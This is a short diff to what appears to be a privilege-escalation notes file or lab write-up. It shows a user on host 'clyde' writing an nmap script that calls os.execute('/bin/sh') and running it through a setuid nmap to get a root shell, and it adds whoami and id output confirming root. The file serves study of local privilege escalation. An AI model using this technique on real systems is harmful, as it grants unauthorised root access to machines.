@@ -805,8 +805,10 @@ nmap but no --interactive
 rabbitmq@clyde:/tmp$ echo "os.execute('/bin/sh')" > /tmp/shell.nse
 rabbitmq@clyde:/tmp$ nmap --script=/tmp/shell.nse
 WARNING: Running Nmap setuid, as you are doing, is a major security risk.
+# whoami
+root
 # id
-uid=107 gid=112(rabbitmq) euid=0 groups=112(rabbitmq)
+uid=107(rabbitmq) gid=112(rabbitmq) euid=0(root) groups=112(rabbitmq)
 
 ```
 ### DOCKER WOES
